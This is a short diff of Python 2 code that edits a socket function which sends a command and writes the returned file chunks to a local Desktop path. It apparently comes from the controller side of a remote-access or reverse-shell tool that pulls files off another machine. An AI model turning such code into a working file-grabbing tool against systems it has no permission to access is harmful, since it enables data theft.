@@ -3,11 +3,11 @@ import os
 
 def transfer(conn, command):
     conn.send(command)
-    f = open('/Raven/Desktop/incomingFile.png', 'wb')
+    f = open('/Users/Raven/Desktop/incomingFile.jpg', 'wb')
     while True:
         bits = conn.recv(1024)
-        if 'Unable to find out the file' in bits:
-            print '[-] Unable to find out the file'
+        if 'Unable to find the file' in bits:
+            print '[-] Unable to find the file'
             break
 
         if bits.endswith('DONE'):
